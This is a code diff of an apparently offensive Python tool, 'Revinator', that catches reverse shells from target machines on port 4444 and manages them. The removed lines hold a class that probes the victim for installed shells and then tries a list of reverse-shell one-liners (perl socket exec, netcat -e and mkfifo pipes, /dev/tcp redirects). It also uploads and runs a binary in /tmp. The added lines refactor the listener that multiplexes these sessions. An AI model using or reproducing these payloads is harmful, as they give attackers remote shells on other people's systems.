@@ -10,230 +10,25 @@ import time
 IP = ""
 PORT = 4444
 s = None
-
-
 new_rev = {}
-
 num_cons = 0
 unique_addresses = []
 
 
-
-class connection:
-    def __init__(self, conn, first=False):
-        self.conn = conn[0]
-        self.addr = conn[1][0]
-        self.port = conn[1][1]
-        self.in_file = f"{self.addr}/in"
-        self.out_file = f"{self.addr}/out"
-        self.sock = socket.socket()
-        self.connected = False
-        self.record = True
-        self.recorded = ""
-        self.rev = []
-        self.working_rev = ""
-        self.cmd = False
-        self.first = first
-        self.echo_command = None
-        self.conn.settimeout(0.2)
-        if not self.echo_cmd_test():
-            print("ERROR IN ECHO TEST")
-        if self.first:
-            threading.Thread(target=self.set_rev).start()
-
-
-    def rcv_stream(self):
-        self.recorded = ""
-        self.cmd = True
-        while self.cmd:
-            try:
-                data = self.conn.recv(1024).decode()
-                if data:
-                    self.recorded += data
-            except TimeoutError:
-                break
-            
-    def echo_cmd_test(self):
-        cmd = "echo HI_REVINATOR\n"
-        self.conn.send(cmd.encode())
-
-        #threading.Thread(target=self.rcv_stream).start()
-        self.rcv_stream()
-
-        #time.sleep(0.1)
-        self.cmd = False
-        print("ECHO TEST:",self.recorded)
-
-        self.echo_command = self.recorded.count("echo HI_REVINATOR")
-        if "HI_REVINATOR" not in self.recorded:
-            print("HI_REVINATOR is NOT in: ", self.recorded)
-            return False
-        return True
-
-    def send_rcv(self, cmd):
-
-        cmd += "; echo REVINATOR_COMPLETE\r\n\r\n"
-        self.conn.send(cmd.encode())
-
-        #threading.Thread(target=self.rcv_stream).start()
-        self.rcv_stream()
-        while self.recorded.count("REVINATOR_COMPLETE") < self.echo_command + 1:
-            time.sleep(0.1)
-
-        self.cmd = False
-        return self.recorded
-
-
-    def test_revs(self):
-        global num_cons
-        inc = ["","&"]
-        for i in inc:
-            for rev in self.rev:
-                rev += f" {i} \r\n\r\n"
-                print("TESTING REV: ", rev)
-                num = num_cons
-                self.conn.send(rev.encode())
-                time.sleep(0.5)
-                if num_cons > num:
-                    self.working_rev = rev
-                    return
-            
-
-    def send(self, st):
-        st = st + "\n"
-        self.conn.send(st.encode())
-
-    def recv(self):
-        r = ""
-        try:
-            r = self.conn.recv(1024).decode()
-        except:
-            pass
-        return r
-
-
-
-    def set_rev(self):
-        global new_rev
-        self.send_rcv("find /bin/ /usr/bin/")
-
-        bins = self.recorded.split("\n")
-        shells = ["dash","bash","sh","bsh","csh","ksh","zsh","pdksh","tcsh","mksh"]
-        known_shells = []
-        progs = {}
-
-        for bin in bins:
-            progs[bin.split("/")[-1]] = bin
-
-        if "script" in progs:
-            print("SENDING LOLZ")
-            self.send("cat > /tmp/revinator; chmod +x /tmp/revinator; /tmp/revinator")#
-            FILE = "rev5555"
-            with open(FILE,"rb") as f:
-                r = f.read()
-            self.conn.sendall(r)
-            self.conn.sendall("\x04".encode())
-            self.conn.close()
-            #self.send(f"\x04")
-            #self.send("chmod +x /tmp/revinator")
-            #self.send("/tmp/revinator")
-            self.rev.append("/tmp/revinator &")
-            return
-
-
-        if "perl" in progs:
-            for sh in shells:
-                if sh in progs:
-                    c = """perl -e 'use Socket;$i="IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("SH -i");};'""".replace("IP", IP).replace("PORT", str(PORT)).replace("SH", sh)
-                    self.rev.append(c)
-
-
-        for shell in shells:
-            sh = f"/bin/{shell}"
-            if sh in bins:
-                known_shells.append(sh)
-
-            sh = f"/usr/bin/{shell}"
-            if sh in bins:
-                known_shells.append(sh)
-
-
-        if "/usr/bin/nc" in bins:
-            for sh in known_shells:
-                self.rev.append(f"nc {IP} {PORT} -e {sh} ")
-                self.rev.append(f"nc -c {sh} {IP} {PORT} ")
-                self.rev.append(f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f| {sh} -i 2>&1|nc {IP} {PORT} >/tmp/f ")
-                self.rev.append(f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f| {sh} -i 2>&1| /usr/bin/nc {IP} {PORT} >/tmp/f ")
-                self.rev.append(f"/usr/bin/nc {IP} {PORT} -e {sh} ")
-                self.rev.append(f"/usr/bin/nc -c {sh} {IP} {PORT} ")
-
-        if "/bin/nc" in bins:
-            for sh in known_shells:
-                self.rev.append(f"nc {IP} {PORT} -e {sh}")
-                self.rev.append(f"nc -c {sh} {IP} {PORT}")
-                self.rev.append(f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{sh} -i 2>&1|nc {IP} {PORT} >/tmp/f")
-                self.rev.append(f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{sh} -i 2>&1|/bin/nc {IP} {PORT} >/tmp/f")
-                self.rev.append(f"/bin/nc {IP} {PORT} -e {sh} ")
-                self.rev.append(f"/usr/bin/nc -c {sh} {IP} {PORT} ")
-
-        for sh in known_shells:
-            self.rev.append(f"0<&196;exec 196<>/dev/tcp/{IP}/{PORT}; {sh} <&196 >&196 2>&196")
-            self.rev.append(f"{sh} -i >& /dev/tcp/{IP}/{PORT} 0>&1")
-
-
-        self.test_revs()
-        global unique_addresses
-        print("REV = "+ self.working_rev)
-        print(f"{len(unique_addresses) - 1}:\t{self.addr}")
-        #new_rev[self.addr] = self.rev
-        self.record = False
-        self.conn.settimeout(None)
-
-
-    def create_new(self):
-        self.conn.send(self.working_rev.encode())
-
-    def connect(self, sock):
-
-        self.sock = sock[0]
-        self.connected = True
-        self.conn.setblocking(True)
-        threading.Thread(target=self.in_stream).start()
-        threading.Thread(target=self.out_stream).start()
-
-
-
-    def in_stream(self):
-        while True:
-            data = self.conn.recv(1024)
-            if data and len(data) > 0:
-                #print(data)
-                self.sock.sendall(data)
-            else:
-                time.sleep(0.1)
-
-
-    def out_stream(self):
-        while True:
-            data = self.sock.recv(1024)
-            if data and len(data) > 0:
-                #print(data)
-                self.conn.sendall(data)
-            else:
-                time.sleep(0.1)
-    
+from spawner import spawner
+from connection import connection
 
 
 def send(ip, cmd):
     global IP, PORT
-    s = socket.socket()
-    s.connect(("127.0.0.1", PORT))
+    new_s = socket.socket()
+    new_s.connect(("127.0.0.1", PORT))
     st = str(ip) + "\n"
-    s.sendall(st.encode())
-    time.sleep(0.01)
+    new_s.sendall(st.encode())
+    time.sleep(0.1)
     st = str(cmd) + "\n"
-    s.sendall(st.encode())
-    r = s.recv(1024).decode()
+    new_s.sendall(st.encode())
+    r = new_s.recv(1024).decode()
     print(r)
 
 def new_window(ip):
@@ -261,11 +56,7 @@ def run_t(ip):
 def run(quiet_mode=False):
     global s, IP, num_cons, unique_addresses
     connections = []
-    managed_connections = []
-    addresses = {}
     waitingl = []
-    waitingd = {}
-    global latest
 
     HOST = ''
     global PORT
@@ -278,50 +69,56 @@ def run(quiet_mode=False):
         waiting = 0
         while True:
             connections.append(s.accept())
+            c = connections[-1]
+            addr = c[1][0]
+            sock = c[0]
 
-            if connections[-1][1][0] == "127.0.0.1":    # connection from local user
-                ip = connections[-1][0].recv(1024).decode().split("/")[-1].replace("\n","")
+
+
+            if addr == "127.0.0.1":    # connection from local user
+                ip_unique_id = int(sock.recv(1024).decode().split("/")[-1].replace("\n",""))
                 try:
-                    addresses[unique_addresses[int(ip)]].create_new()
-                    ip = unique_addresses[int(ip)]
+                    spawner.all[unique_addresses[ip_unique_id]].create_new()
+                    ip = unique_addresses[ip_unique_id]
                 except:
                     try:
-                        addresses[ip].create_new()
+                        spawner.all[ip].create_new()
                     except:
                         print("unable to attach to " + str(ip))
                         continue
-                waitingl.append([ip, connections[-1]])
+                waitingl.append([ip, c])
 
-            else:                                       # connection from target machine
-                print("CONNECTION")
-                num_cons += 1
-                #pdb.set_trace()
-                if IP == "":
-                    IP = connections[-1][0].getsockname()[0]
-                latest = connections[-1][1][0]
-                if not latest in addresses:
-                    managed_connections.append(connection(connections[-1], True))
-                else:
-                    managed_connections.append(connection(connections[-1]))
-                
-                
+            else:   # connection from target machine
 
-                if not latest in addresses:             # if unique address
-                    id = len(unique_addresses)
-                    d = (f"/tmp/{id}")
+                if addr not in spawner.all: # if unique address
+                    c = spawner(c)
+                    if c.kill_cmd:
+                        continue
+                    ID = len(unique_addresses)
+                    d = (f"/tmp/{ID}")
                     try:
                         os.mkdir(d)
                     except:
                         pass
-                    addresses[latest] = managed_connections[-1]
-                    unique_addresses.append(latest)
+                    unique_addresses.append(addr)
                     if not quiet_mode:
-                        threading.Thread(target=run_t,args=(id,)).start()
+                        threading.Thread(target=run_t,args=(ID,)).start()
+
+                else: # not unique
                 
-            for w in waitingl:                      # if user is waiting to connect
-                if managed_connections[-1].addr == w[0]:
-                    managed_connections[-1].connect(w[1])
-                    waitingl.remove(w)
+                    spawner.all[addr].num_cons += 1
+                    c = connection(c)
+                    if c.kill_cmd:
+                        continue
+
+                        # INFO -  waitingl.append([ip, c])
+                    for w in waitingl:    # if user is waiting to connect
+                        for con in connection.all:
+                            if not con.connected:
+                                if con.addr == w[0]:
+                                    con.connect(w[1])
+                                    waitingl.remove(w)
+                                    break
 
 
 
